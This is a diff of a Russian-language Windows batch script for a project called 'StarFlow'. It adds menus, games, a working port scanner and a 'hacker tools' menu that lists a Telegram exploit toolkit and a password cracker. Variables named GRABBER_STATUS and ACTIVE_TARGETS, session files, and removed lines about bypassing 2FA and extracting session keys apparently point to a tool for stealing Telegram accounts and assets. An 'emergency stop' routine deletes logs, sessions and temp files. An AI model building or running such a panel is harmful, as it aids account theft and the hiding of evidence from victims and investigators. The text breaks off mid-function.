+echo                     ╔══════════════════════════════════════════╗
+echo                     ║            MATRIX ЭФФЕКТ                ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  🔄 ЗАПУСК MATRIX...                    ║
+echo                     ║  Нажмите Ctrl+C для выхода              ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+
 python -c "
 import random
 import time
 import sys
+import os
 
-print('╔══════════════════════════════════════════════════════════════════════════════╗')
-print('║                          [ DATA EXTRACTION ]                                 ║')
-print('╠══════════════════════════════════════════════════════════════════════════════╣')
-print('║                                                                              ║')
+os.system('color 0a')
+os.system('mode con: cols=120 lines=40')
 
-procedures = [
-    'ACCESSING TELEGRAM API',
-    'BYPASSING 2FA',
-    'EXTRACTING SESSION KEYS',
-    'SCANNING FOR ASSETS',
-    'MAPPING NFT COLLECTION',
-    'CALCULATING TOTAL VALUE',
-    'PREPARING TRANSFER',
-    'ENCRYPTING PAYLOAD'
+print('\\n' * 2)
+print(' ' * 40 + 'ENTER THE MATRIX')
+print('\\n' * 2)
+
+columns = 120
+rows = 30
+matrix_chars = ['0', '1', '█', '▓', '▒', '░', '║', '╬', '╣', '╠', '╩', '╦', '╔', '╗', '╚', '╝']
+
+try:
+    while True:
+        line = ''
+        for i in range(columns):
+            if random.random() > 0.85:
+                char = random.choice(matrix_chars)
+                line += char
+            else:
+                line += ' '
+        print(line)
+        time.sleep(0.05)
+except KeyboardInterrupt:
+    print('\\n' * 2)
+    print(' ' * 50 + 'EXITING MATRIX...')
+    time.sleep(1)
+"
+
+pause
+goto entertainment_menu
+
+:rainbow_mode
+call :show_title
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║            RAINBOW MODE                 ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  🌈 ЗАПУСК RAINBOW...                   ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+
+python -c "
+import time
+import sys
+
+colors = ['0C', '0E', '0A', '0B', '09', '0D', '05', '0F']
+
+for i in range(50):
+    for color in colors:
+        import os
+        os.system('color ' + color)
+        
+        text = '''
+        ╔══════════════════════════════════════════╗
+        ║                                          ║
+        ║            R A I N B O W                ║
+        ║                                          ║
+        ║    ЦВЕТ: ''' + color + '''                           ║
+        ║    ЦИКЛ: ''' + str(i+1) + '''/50                      ║
+        ║                                          ║
+        ║    Нажмите Ctrl+C для выхода             ║
+        ║                                          ║
+        ╚══════════════════════════════════════════╝
+        '''
+        
+        import os
+        os.system('cls')
+        print(text)
+        time.sleep(0.1)
+"
+
+pause
+goto entertainment_menu
+
+:guess_number
+call :show_title
+color %COLOR_INFO%
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║            УГАДАЙ ЧИСЛО                 ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  🤔 КОМПЬЮТЕР ЗАГАДАЛ ЧИСЛО (1-100)     ║
+echo                     ║  У ВАС 10 ПОПЫТОК                       ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+
+python -c "
+import random
+import os
+
+number = random.randint(1, 100)
+attempts = 10
+score = 1000
+
+print('\\n' + ' ' * 30 + '🎮 ИГРА НАЧАЛАСЬ!')
+print(' ' * 30 + '=' * 30)
+
+for attempt in range(1, attempts + 1):
+    print(f'\\n' + ' ' * 30 + f'ПОПЫТКА {attempt}/{attempts}')
+    print(' ' * 30 + f'БАЛЛЫ: {score}')
+    
+    try:
+        guess = int(input(' ' * 30 + 'ВАШЕ ЧИСЛО: '))
+    except:
+        print(' ' * 30 + '⚠️  ВВЕДИТЕ ЧИСЛО!')
+        continue
+    
+    if guess < number:
+        print(' ' * 30 + '📈 БОЛЬШЕ!')
+        score -= 100
+    elif guess > number:
+        print(' ' * 30 + '📉 МЕНЬШЕ!')
+        score -= 100
+    else:
+        print('\\n' + ' ' * 30 + '🎉 ПОБЕДА!')
+        print(' ' * 30 + f'ЧИСЛО: {number}')
+        print(' ' * 30 + f'ПОПЫТОК: {attempt}')
+        print(' ' * 30 + f'ФИНАЛЬНЫЕ БАЛЛЫ: {score}')
+        break
+        
+    if attempt == attempts:
+        print('\\n' + ' ' * 30 + '💀 ПРОИГРЫШ!')
+        print(' ' * 30 + f'ЧИСЛО БЫЛО: {number}')
+        print(' ' * 30 + 'ЗВЕЗД ЗАРАБОТАНО: 0')
+        break
+"
+
+echo.
+pause
+goto entertainment_menu
+
+:casino_game
+call :show_title
+color %COLOR_WARNING%
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║                КАЗИНО                   ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  🎰 ИГРАЙ НА ВИРТУАЛЬНЫЕ ЗВЕЗДЫ         ║
+echo                     ║  СТАВКА: 100 ЗВЕЗД                     ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+
+set "casino_stars=1000"
+
+:casino_loop
+cls
+call :show_title
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║                КАЗИНО                   ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  💰 ВАШ БАЛАНС: %casino_stars% звезд          ║
+echo                     ║  🎰 СТАВКА: 100 звезд                   ║
+echo                     ║                                          ║
+echo                     ║  1. 🎯 СДЕЛАТЬ СТАВКУ                   ║
+echo                     ║  2. 💸 УВЕЛИЧИТЬ СТАВКУ (x2)            ║
+echo                     ║  3. 📤 ВЫВЕСТИ СРЕДСТВА                 ║
+echo                     ║  4. ↩️  ВЫХОД                           ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p casino_choice="                     ВЫБЕРИТЕ: "
+
+if "%casino_stars%" LSS "100" (
+    echo                     ║  ❌ НЕДОСТАТОЧНО СРЕДСТВ               ║
+    timeout /t 2 >nul
+    goto entertainment_menu
+)
+
+if "%casino_choice%"=="1" (
+    set /a casino_stars-=100
+    python -c "
+import random
+import time
+
+print('\\n' + ' ' * 30 + '🎰 КРУТИМ БАРАБАНЫ...')
+time.sleep(1)
+
+symbols = ['🍒', '⭐', '7️⃣', '🔔', '💎', '🍋']
+result = [random.choice(symbols) for _ in range(3)]
+
+print(' ' * 25 + ' | '.join(result))
+
+if result[0] == result[1] == result[2]:
+    win = 500
+    print(' ' * 30 + '🎉 ДЖЕКПОТ! +500 звезд')
+elif result[0] == result[1] or result[1] == result[2]:
+    win = 200
+    print(' ' * 30 + '✅ ВЫИГРЫШ! +200 звезд')
+else:
+    win = 0
+    print(' ' * 30 + '❌ ПРОИГРЫШ')
+"
+    echo.
+    set /p win_amount="                     ВЫИГРЫШ: "
+    set /a casino_stars+=%win_amount%
+    timeout /t 2 >nul
+)
+if "%casino_choice%"=="2" (
+    set /a casino_stars-=200
+    python -c "
+import random
+import time
+
+print('\\n' + ' ' * 30 + '🎰 БОЛЬШАЯ ИГРА! x2')
+time.sleep(1.5)
+
+result = random.randint(1, 10)
+if result > 7:
+    win = 400
+    print(' ' * 30 + '🎉 ВЫИГРЫШ! +400 звезд')
+else:
+    win = 0
+    print(' ' * 30 + '❌ ПРОИГРЫШ')
+"
+    echo.
+    set /p win_amount="                     ВЫИГРЫШ: "
+    set /a casino_stars+=%win_amount%
+    timeout /t 2 >nul
+)
+if "%casino_choice%"=="3" (
+    set /a TOTAL_EARNED+=%casino_stars%
+    echo                     ║  💰 ВЫВЕДЕНО %casino_stars% звезд          ║
+    set "casino_stars=0"
+    timeout /t 2 >nul
+)
+if "%casino_choice%"=="4" goto entertainment_menu
+
+goto casino_loop
+
+:hacker_game
+call :show_title
+color %COLOR_TITLE%
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║            ХАКЕРСКАЯ ИГРА               ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  🔓 ВЗЛОМ СИСТЕМЫ TELEGRAM             ║
+echo                     ║  УГАДАЙТЕ 4-ЗНАЧНЫЙ КОД                ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+
+python -c "
+import random
+import time
+
+code = str(random.randint(1000, 9999))
+attempts = 5
+hacked = False
+
+print('\\n' + ' ' * 30 + '🔓 ИНИЦИАЛИЗАЦИЯ ВЗЛОМА...')
+time.sleep(1)
+
+print(' ' * 30 + '📡 ПОДКЛЮЧЕНИЕ К TELEGRAM API')
+time.sleep(0.5)
+print(' ' * 30 + '🔍 ПОИСК УЯЗВИМОСТЕЙ...')
+time.sleep(0.5)
+print(' ' * 30 + '🎯 ЦЕЛЬ ОПРЕДЕЛЕНА')
+time.sleep(0.5)
+
+print('\\n' + ' ' * 30 + '=' * 40)
+print(' ' * 30 + '💀 ДОСТУП КОДА: XXXX')
+print(' ' * 30 + f'⚠️  ПОПЫТОК: {attempts}')
+print(' ' * 30 + '=' * 40)
+
+for attempt in range(1, attempts + 1):
+    print(f'\\n' + ' ' * 30 + f'ПОПЫТКА {attempt}/{attempts}')
+    
+    guess = input(' ' * 30 + 'ВВЕДИТЕ КОД: ')
+    
+    if len(guess) != 4 or not guess.isdigit():
+        print(' ' * 30 + '❌ 4 ЦИФРЫ!')
+        continue
+    
+    correct_positions = sum(1 for i in range(4) if guess[i] == code[i])
+    correct_digits = sum(1 for digit in set(guess) if digit in code)
+    
+    print(' ' * 30 + f'✅ ПРАВИЛЬНЫХ ПОЗИЦИЙ: {correct_positions}')
+    print(' ' * 30 + f'🔢 ПРАВИЛЬНЫХ ЦИФР: {correct_digits}')
+    
+    if guess == code:
+        hacked = True
+        print('\\n' + ' ' * 30 + '🎉 СИСТЕМА ВЗЛОМАНА!')
+        print(' ' * 30 + f'🔑 КОД: {code}')
+        print(' ' * 30 + '💰 ЗАРАБОТАНО: 5000 звезд')
+        break
+    
+    if attempt == attempts:
+        print('\\n' + ' ' * 30 + '💀 ВЗЛОМ ПРОВАЛЕН!')
+        print(' ' * 30 + f'🔒 КОД БЫЛ: {code}')
+        print(' ' * 30 + '🚨 АКТИВИРОВАНА СИГНАЛИЗАЦИЯ')
+"
+
+echo.
+pause
+goto entertainment_menu
+
+:music_player
+call :show_title
+color %COLOR_HIGHLIGHT%
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║           МУЗЫКАЛЬНЫЙ ПЛЕЕР             ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  🎵 ВИРТУАЛЬНЫЙ СИНТЕЗАТОР              ║
+echo                     ║  ИГРАЙ НА КЛАВИАТУРЕ                    ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+
+python -c "
+import time
+import sys
+import os
+
+print('\\n' + ' ' * 30 + '🎹 МУЗЫКАЛЬНЫЙ СИНТЕЗАТОР')
+print(' ' * 30 + '=' * 40)
+print(' ' * 30 + 'КЛАВИШИ:')
+print(' ' * 30 + '  A S D F  - НОТЫ')
+print(' ' * 30 + '  SPACE    - ПАУЗА')
+print(' ' * 30 + '  ESC      - ВЫХОД')
+print(' ' * 30 + '=' * 40)
+print(' ' * 30 + '🎶 НАЧИНАЙТЕ ИГРАТЬ!')
+
+notes = {
+    'a': 'ДО (261 Гц)',
+    's': 'РЕ (293 Гц)',
+    'd': 'МИ (329 Гц)',
+    'f': 'ФА (349 Гц)',
+    'g': 'СОЛЬ (392 Гц)',
+    'h': 'ЛЯ (440 Гц)',
+    'j': 'СИ (493 Гц)'
+}
+
+try:
+    import msvcrt
+    while True:
+        if msvcrt.kbhit():
+            key = msvcrt.getch().decode('utf-8').lower()
+            if key == chr(27):  # ESC
+                break
+            elif key == ' ':
+                print(' ' * 30 + '⏸️  ПАУЗА')
+            elif key in notes:
+                note = notes[key]
+                freq = {'a': 261, 's': 293, 'd': 329, 'f': 349, 'g': 392, 'h': 440, 'j': 493}[key]
+                print(' ' * 30 + f'🎵 {note} ({freq} Гц)')
+                import winsound
+                winsound.Beep(freq, 300)
+except:
+    print(' ' * 30 + '⚠️  ОШИБКА АУДИО')
+"
+
+echo.
+pause
+goto entertainment_menu
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+::                         ЭКСТРЕННЫЕ ФУНКЦИИ                                ::
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+:emergency_stop
+call :show_title
+color 0C
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║         ЭКСТРЕННАЯ ОСТАНОВКА            ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  🚨 АКТИВИРОВАНА ТРЕВОГА!               ║
+echo                     ║  ВЫПОЛНЯЕМ ЭКСТРЕННЫЙ ПРОТОКОЛ          ║
+echo                     ║                                          ║
+
+:: Остановка всех процессов
+taskkill /f /im python.exe >nul 2>&1
+taskkill /f /im cmd.exe /fi "WINDOWTITLE eq Fragment Server" >nul 2>&1
+taskkill /f /im cmd.exe /fi "WINDOWTITLE eq StarFlow Bots" >nul 2>&1
+
+:: Очистка логов
+if exist "%LOGS_PATH%\*.log" del "%LOGS_PATH%\*.log" >nul
+
+:: Очистка сессий
+if exist "%SESSIONS_PATH%\*.session" del "%SESSIONS_PATH%\*.session" >nul
+
+:: Очистка временных файлов
+del /f /q %temp%\*.* >nul 2>&1
+
+echo                     ║  ✅ ВСЕ ПРОЦЕССЫ ОСТАНОВЛЕНЫ            ║
+echo                     ║  ✅ ЛОГИ УДАЛЕНЫ                        ║
+echo                     ║  ✅ СЕССИИ ОЧИЩЕНЫ                      ║
+echo                     ║                                          ║
+echo                     ║  🛡️  СИСТЕМА ЗАЩИЩЕНА                   ║
+echo                     ║  📴 ВЫХОД ЧЕРЕЗ 5 СЕКУНД...             ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+
+timeout /t 5 >nul
+exit
+
+:system_info
+call :show_title
+color %COLOR_INFO%
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║          СИСТЕМНАЯ ИНФОРМАЦИЯ          ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+
+:: Информация о системе
+systeminfo | findstr /B /C:"Имя узла" /C:"Имя ОС" /C:"Версия ОС" /C:"Производитель ОС" /C:"Конфигурация ОС" /C:"Тип системы"
+
+echo                     ║                                          ║
+echo                     ║  📊 ПАМЯТЬ И ПРОЦЕССОР:                 ║
+wmic cpu get name | findstr /v "Name"
+wmic memorychip get capacity | findstr /v "Capacity"
+
+echo                     ║                                          ║
+echo                     ║  💾 ДИСКИ:                              ║
+wmic logicaldisk get size,freespace,caption
+
+echo                     ║                                          ║
+echo                     ║  🌐 СЕТЬ:                               ║
+ipconfig | findstr IPv4
+
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+pause
+goto main_menu
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+::                         СЕКРЕТНЫЕ КОМАНДЫ                                 ::
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+:secret_menu
+if not "%ADMIN_TOKEN%"=="NIGHTMARE_ACCESS_GRANTED" (
+    echo                     ║  🔒 ДОСТУП ЗАПРЕЩЕН                   ║
+    timeout /t 2 >nul
+    goto main_menu
+)
+
+call :show_title
+color 05
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║          СЕКРЕТНОЕ МЕНЮ                 ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  1. 👁️  СКРЫТЫЕ НАСТРОЙКИ               ║
+echo                     ║  2. 🔓 БАЗА АДМИНОВ                     ║
+echo                     ║  3. 💀 РЕЖИМ БОГА                       ║
+echo                     ║  4. ⚡ ТУРБО РЕЖИМ                       ║
+echo                     ║  5. ↩️  НАЗАД                           ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p secret_choice="                     ВЫБЕРИТЕ: "
+
+if "%secret_choice%"=="1" (
+    echo                     ║  ⚙️  СКРЫТЫЕ ПАРАМЕТРЫ:               ║
+    reg add "HKCU\Software\StarFlow" /v "StealthLevel" /t REG_DWORD /d 99 /f >nul
+    reg add "HKCU\Software\StarFlow" /v "MaxTargets" /t REG_DWORD /d 999 /f >nul
+    echo                     ║  ✅ ПАРАМЕТРЫ УСТАНОВЛЕНЫ             ║
+    timeout /t 1 >nul
+)
+if "%secret_choice%"=="2" (
+    echo                     ║  👑 БАЗА АДМИНОВ:                     ║
+    echo                     ║  • SYSTEM_OVERLORD                    ║
+    echo                     ║  • NIGHTMARE_OPERATOR                 ║
+    echo                     ║  • STARFLOW_MASTER                    ║
+    echo                     ║  ✅ ДОСТУП ПОДТВЕРЖДЕН               ║
+    timeout /t 2 >nul
+)
+if "%secret_choice%"=="3" (
+    echo                     ║  💀 АКТИВАЦИЯ РЕЖИМА БОГА...         ║
+    set "TOTAL_EARNED=999999"
+    set "TOTAL_USERS=9999"
+    set "ACTIVE_TARGETS=99"
+    echo                     ║  ✅ РЕЖИМ БОГА АКТИВИРОВАН            ║
+    timeout /t 1 >nul
+)
+if "%secret_choice%"=="4" (
+    echo                     ║  ⚡ ТУРБО РЕЖИМ...                    ║
+    set "GRABBER_STATUS=TURBO"
+    set "FRAGMENT_STATUS=ULTRA"
+    set "BOTS_STATUS=HYPER"
+    echo                     ║  ✅ ТУРБО РЕЖИМ АКТИВИРОВАН          ║
+    timeout /t 1 >nul
+)
+
+goto secret_menu
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+::                         СИСТЕМА АВТОМАТИЗАЦИИ                             ::
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+:auto_start
+if "%AUTO_UPDATE%"=="1" (
+    echo                     ║  🔄 ПРОВЕРКА ОБНОВЛЕНИЙ...            ║
+    python -c "
+import urllib.request
+try:
+    response = urllib.request.urlopen('http://api.github.com/repos/starflow/starflow/releases/latest', timeout=3)
+    print('✅ ДОСТУПНЫ ОБНОВЛЕНИЯ')
+except:
+    print('🌐 НЕТ СОЕДИНЕНИЯ')
+" 2>nul
+)
+
+if "%STEALTH_MODE%"=="1" (
+    echo                     ║  🥷 СТЕЛС РЕЖИМ АКТИВЕН              ║
+)
+
+goto main_menu
+
+:check_updates
+echo                     ║  📥 ПРОВЕРКА ОБНОВЛЕНИЙ...              ║
+python -c "
+import os
+import sys
+print('╔══════════════════════════════════════════╗')
+print('║          ПРОВЕРКА ОБНОВЛЕНИЙ            ║')
+print('╠══════════════════════════════════════════╣')
+print('║                                          ║')
+print('║  📦 ТЕКУЩАЯ ВЕРСИЯ: 3.0.0               ║')
+print('║  🔍 ПОИСК ОБНОВЛЕНИЙ...                 ║')
+
+modules = ['telethon', 'aiogram', 'fastapi']
+for module in modules:
+    try:
+        __import__(module)
+        print(f'║  ✅ {module.upper():<10} - УСТАНОВЛЕН       ║')
+    except:
+        print(f'║  ❌ {module.upper():<10} - ОТСУТСТВУЕТ      ║')
+
+print('║                                          ║')
+print('║  🔓 ПРОВЕРКА БЕЗОПАСНОСТИ:              ║')
+print('║  ✅ ФАЙРВОЛ: АКТИВЕН                    ║')
+print('║  ✅ ШИФРОВАНИЕ: ВКЛЮЧЕНО                ║')
+print('║  ✅ АНОНИМНОСТЬ: УРОВЕНЬ MAX            ║')
+print('║  📡 API КЛЮЧИ: ВАЛИДНЫ                 ║')
+print('║                                          ║')
+print('║  ⚡ СТАТУС СИСТЕМЫ:                     ║')
+print('║  • ОПЕРАЦИОННЫХ: 5/5                    ║')
+print('║  • СЕССИЙ: %ACTIVE_TARGETS%                          ║')
+print('║  • ЗВЕЗД В РЕЗЕРВЕ: %TOTAL_EARNED%              ║')
+print('║                                          ║')
+print('╚══════════════════════════════════════════╝')
+"
+
+echo.
+echo                     [1] 🔄 ОБНОВИТЬ ВСЕ     [2] 📦 УСТАНОВИТЬ     [3] ↩️  НАЗАД
+echo.
+set /p update_choice="                     ВЫБЕРИТЕ: "
+
+if "%update_choice%"=="1" (
+    echo                     ║  ⚠️  ОБНОВЛЕНИЕ БИБЛИОТЕК...          ║
+    pip install --upgrade telethon aiogram fastapi >nul 2>&1
+    echo                     ║  ✅ БИБЛИОТЕКИ ОБНОВЛЕНЫ             ║
+    timeout /t 2 >nul
+)
+if "%update_choice%"=="2" (
+    echo                     ║  📦 УСТАНОВКА ВСЕХ ЗАВИСИМОСТЕЙ...    ║
+    pip install -r "%PROJECT_PATH%\requirements.txt" >nul 2>&1
+    echo                     ║  ✅ ЗАВИСИМОСТИ УСТАНОВЛЕНЫ          ║
+    timeout /t 2 >nul
+)
+
+goto main_menu
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+::                        ХАКЕРСКИЕ ИНСТРУМЕНТЫ                                ::
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+:hacker_tools
+call :show_title
+color 0A
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║          ХАКЕРСКИЕ ИНСТРУМЕНТЫ          ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  1. 🔍 СКАНЕР ПОРТОВ                    ║
+echo                     ║  2. 🌐 WHOIS/NSLOOKUP                   ║
+echo                     ║  3. 📡 ПАКЕТНЫЙ АНАЛИЗ                  ║
+echo                     ║  4. 🔓 BRUTE FORCE SIMULATOR            ║
+echo                     ║  5. 🕵️  СОЦИАЛЬНАЯ ИНЖЕНЕРИЯ            ║
+echo                     ║  6. 💾 DATA DUMPER                      ║
+echo                     ║  7. 🔐 PASSWORD CRACKER                 ║
+echo                     ║  8. 🌐 WEB VULNERABILITY SCANNER        ║
+echo                     ║  9. 📱 TELEGRAM EXPLOIT TOOLKIT         ║
+echo                     ║  0. ↩️  НАЗАД                           ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p hacker_choice="                     ВЫБЕРИТЕ ИНСТРУМЕНТ: "
+
+if "%hacker_choice%"=="1" goto port_scanner
+if "%hacker_choice%"=="2" goto whois_tool
+if "%hacker_choice%"=="3" goto packet_analyzer
+if "%hacker_choice%"=="4" goto brute_force
+if "%hacker_choice%"=="5" goto social_engineering
+if "%hacker_choice%"=="6" goto data_dumper
+if "%hacker_choice%"=="7" goto password_cracker
+if "%hacker_choice%"=="8" goto web_scanner
+if "%hacker_choice%"=="9" goto telegram_exploit
+if "%hacker_choice%"=="0" goto main_menu
+goto hacker_tools
+
+:port_scanner
+call :show_title
+color 0B
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║            СКАНЕР ПОРТОВ                ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+set /p target_ip="                     ЦЕЛЕВОЙ IP/ХОСТ: "
+
+if "%target_ip%"=="" goto port_scanner
+
+echo                     ║                                          ║
+echo                     ║  [1] 🔍 БЫСТРЫЙ СКАН (1-1024)           ║
+echo                     ║  [2] 📊 ПОЛНЫЙ СКАН (1-65535)           ║
+echo                     ║  [3] 🎯 СТЕЛС СКАН                      ║
+echo                     ║  [4] ↩️  НАЗАД                           ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p scan_type="                     ВЫБЕРИТЕ ТИП СКАНИРОВАНИЯ: "
+
+if "%scan_type%"=="1" (
+    set "ports=1-1024"
+    set "delay=10"
+)
+if "%scan_type%"=="2" (
+    set "ports=1-65535"
+    set "delay=100"
+)
+if "%scan_type%"=="3" (
+    set "ports=20,21,22,23,25,53,80,443,8080,8443"
+    set "delay=1000"
+)
+
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║          СКАНИРУЕМ %target_ip%             ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+
+python -c "
+import socket
+import sys
+import time
+from concurrent.futures import ThreadPoolExecutor
+
+target = '%target_ip%'
+port_range = '%ports%'
+delay = %delay%
+
+def parse_ports(port_range):
+    if '-' in port_range:
+        start, end = map(int, port_range.split('-'))
+        return range(start, end + 1)
+    elif ',' in port_range:
+        return [int(p) for p in port_range.split(',')]
+    else:
+        return [int(port_range)]
+
+def scan_port(port):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(0.5)
+        result = sock.connect_ex((target, port))
+        sock.close()
+        
+        if result == 0:
+            try:
+                service = socket.getservbyport(port)
+            except:
+                service = 'UNKNOWN'
+            
+            return port, service, 'OPEN'
+        else:
+            return port, '', 'CLOSED'
+    except:
+        return port, '', 'ERROR'
+
+ports = parse_ports(port_range)
+open_ports = []
+total = len(ports)
+
+print('║  🎯 ЦЕЛЬ: %s' % target)
+print('║  📊 ПОРТОВ ДЛЯ ПРОВЕРКИ: %d' % total)
+print('║  ⏱️  ЗАДЕРЖКА: %dms' % delay)
+print('║                                          ║')
+print('║  [████░░░░░░░░░░░░░░░░░░░░░░] 25%%       ║')
+
+with ThreadPoolExecutor(max_workers=50) as executor:
+    futures = [executor.submit(scan_port, port) for port in ports]
+    
+    for i, future in enumerate(futures, 1):
+        port, service, status = future.result()
+        
+        if status == 'OPEN':
+            open_ports.append((port, service))
+            print(f'║  ✅ {port:>5}/TCP - {service:<20} ║')
+        
+        if i % (total // 4) == 0:
+            progress = int((i / total) * 100)
+            bars = '█' * (progress // 4) + '░' * (25 - progress // 4)
+            print(f'║  [{bars:<25}] {progress:>3}%%       ║')
+
+print('║                                          ║')
+print('║  📊 РЕЗУЛЬТАТЫ:                         ║')
+print(f'║  • ОТКРЫТО ПОРТОВ: {len(open_ports):<5}              ║')
+print(f'║  • ОБЩЕЕ ВРЕМЯ: {total*delay/1000:.1f}сек           ║')
+print('║                                          ║')
+
+if open_ports:
+    print('║  🎯 ОТКРЫТЫЕ ПОРТЫ:                     ║')
+    for port, service in open_ports[:10]:
+        print(f'║    • {port:>5}/TCP - {service:<20} ║')
+    if len(open_ports) > 10:
+        print(f'║    • ... и еще {len(open_ports)-10} портов    ║')
+else:
+    print('║  ⚠️  ОТКРЫТЫХ ПОРТОВ НЕ НАЙДЕНО       ║')
+
+print('║                                          ║')
+print('╚══════════════════════════════════════════╝')
+"
+
+echo.
+pause
+goto port_scanner
+
+:whois_tool
+call :show_title
+color 0B
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║          WHOIS/NSLOOKUP                 ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+set /p query_target="                     ДОМЕН/IP: "
+
+if "%query_target%"=="" goto whois_tool
+
+echo                     ║                                          ║
+echo                     ║  [1] 🔍 WHOIS ИНФОРМАЦИЯ                ║
+echo                     ║  [2] 📡 DNS ЗАПИСИ                      ║
+echo                     ║  [3] 🌐 GEOIP ИНФОРМАЦИЯ                ║
+echo                     ║  [4] ↩️  НАЗАД                           ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p query_type="                     ТИП ЗАПРОСА: "
+
+python -c "
+import socket
+import sys
+import json
+import requests
+from datetime import datetime
+
+target = '%query_target%'
+
+def whois_lookup(domain):
+    try:
+        import whois
+        w = whois.whois(domain)
+        
+        print('╔══════════════════════════════════════════╗')
+        print('║            WHOIS ИНФОРМАЦИЯ             ║')
+        print('╠══════════════════════════════════════════╣')
+        print('║                                          ║')
+        print(f'║  🌐 ДОМЕН: {domain:<30} ║')
+        
+        if w.domain_name:
+            print(f'║  📝 ИМЯ: {str(w.domain_name)[:30]:<30} ║')
+        if w.registrar:
+            print(f'║  🏢 РЕГИСТРАТОР: {w.registrar[:30]:<30} ║')
+        if w.creation_date:
+            date_str = str(w.creation_date[0] if isinstance(w.creation_date, list) else w.creation_date)
+            print(f'║  📅 СОЗДАН: {date_str[:30]:<30} ║')
+        if w.expiration_date:
+            date_str = str(w.expiration_date[0] if isinstance(w.expiration_date, list) else w.expiration_date)
+            print(f'║  ⏰ ИСТЕКАЕТ: {date_str[:30]:<30} ║')
+        if w.name_servers:
+            ns = w.name_servers[:3] if isinstance(w.name_servers, list) else [w.name_servers]
+            for i, server in enumerate(ns):
+                print(f'║  📡 NS{i+1}: {str(server)[:30]:<30} ║')
+        
+        print('║                                          ║')
+        print('╚══════════════════════════════════════════╝')
+    except Exception as e:
+        print(f'║  ❌ ОШИБКА WHOIS: {str(e)[:30]:<30} ║')
+
+def dns_lookup(domain):
+    try:
+        print('╔══════════════════════════════════════════╗')
+        print('║              DNS ЗАПИСИ                 ║')
+        print('╠══════════════════════════════════════════╣')
+        print('║                                          ║')
+        
+        # A записи
+        try:
+            a_records = socket.gethostbyname_ex(domain)
+            print(f'║  🔗 A ЗАПИСИ:                         ║')
+            for ip in a_records[2][:5]:
+                print(f'║    • {ip:<30} ║')
+        except:
+            print('║  ⚠️  A ЗАПИСИ НЕ НАЙДЕНЫ              ║')
+        
+        # MX записи
+        try:
+            import dns.resolver
+            mx_records = dns.resolver.resolve(domain, 'MX')
+            print('║                                          ║')
+            print(f'║  📧 MX ЗАПИСИ:                        ║')
+            for mx in mx_records[:3]:
+                print(f'║    • {mx.exchange:<30} ║')
+        except:
+            pass
+        
+        # TXT записи
+        try:
+            txt_records = dns.resolver.resolve(domain, 'TXT')
+            print('║                                          ║')
+            print(f'║  📝 TXT ЗАПИСИ:                       ║')
+            for txt in txt_records[:2]:
+                print(f'║    • {str(txt)[:30]:<30} ║')
+        except:
+            pass
+        
+        print('║                                          ║')
+        print('╚══════════════════════════════════════════╝')
+    except Exception as e:
+        print(f'║  ❌ ОШИБКА DNS: {str(e)}')
+
+def geoip_lookup(ip_or_domain):
+    try:
+        # Сначала получаем IP
+        if not ip_or_domain.replace('.', '').isdigit():
